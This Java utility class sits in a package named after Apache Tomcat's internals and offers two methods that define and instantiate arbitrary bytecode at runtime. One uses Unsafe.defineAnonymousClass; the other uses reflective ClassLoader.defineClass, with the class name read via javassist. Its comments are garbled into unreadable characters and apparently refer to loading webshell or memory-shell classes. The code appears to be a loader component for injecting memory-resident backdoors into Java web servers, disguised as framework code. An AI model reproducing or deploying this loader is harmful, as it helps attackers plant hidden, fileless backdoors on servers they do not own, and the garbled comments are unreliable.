package org.apache.catalina.core.utils;

import javassist.ClassPool;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

public class Util {
    //���������ȡ�� ����Ӣ�ﲻ��
    //����������һ�����ڷ����л����ر�Ы���࣬һ�����ڼ���JMG���� ����ֱ�Ӱ���

    public static Class extendClassLoader(byte[] c) throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InvocationTargetException {
        java.lang.reflect.Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        java.lang.reflect.Method m=sun.misc.Unsafe.class.getDeclaredMethod("defineAnonymousClass", new Class[]{Class.class, byte[].class, Object[].class});
        f.setAccessible(true);
        m.setAccessible(true); //ȫ���ɷ���
        return (Class)m.invoke(f.get(null),new Object[]{java.io.File.class, c, null}); //ִ�з��� ��Ҫ��Ϊ�˲�newһ������
    }

    public static Class abstractClassLoader(byte[] c) throws NoSuchMethodException, SecurityException, ClassNotFoundException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InstantiationException, IOException {
        //����class���������Ҫ�Ȼ�ȡ�����ټ���
        ClassPool cp =ClassPool.getDefault();
        String cName=cp.makeClass(new ByteArrayInputStream(c)).getName();
        System.out.println(cName); //ԭʼ��
        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
        java.lang.reflect.Method defineClzMethod = clzLoader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass", String.class, byte[].class, Integer.TYPE, Integer.TYPE);
        defineClzMethod.setAccessible(true);
        Class clz = (Class) defineClzMethod.invoke(clzLoader, cName, c, 0, Integer.valueOf(c.length));
        clz.newInstance();
        return clz;
    }

}
